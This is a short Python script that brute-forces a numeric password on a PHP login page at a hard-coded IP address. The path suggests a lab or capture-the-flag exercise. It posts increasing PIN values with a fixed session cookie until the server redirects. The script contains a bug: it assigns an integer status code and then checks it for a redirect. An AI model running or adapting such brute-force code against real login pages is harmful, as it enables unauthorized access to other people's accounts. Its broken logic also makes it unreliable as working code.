import requests
import time
import selenium

url = "http://158.39.188.201/steg1/Guest.php"

pin = 0; 


#r = requests.post(url, data={"password": "1000", "login":""})


headers_dict = {
    "PHPSESSID":"ifrjjrclr2ca33gshuflhsihkf"
    }


r = requests.post(url, data={"password": "1", "login":""}).status_code

print(r)

while not r.is_redirect: 
    data= {
    "password":	f"{pin}",
    "login": ""
    }        
    r = requests.post(url, data=data, cookies=headers_dict)
    
    print(r.is_redirect)
        
    pin +=1
    print(r.status_code)
    time.sleep(1)
    print(data)
    
# print(pin) 
   

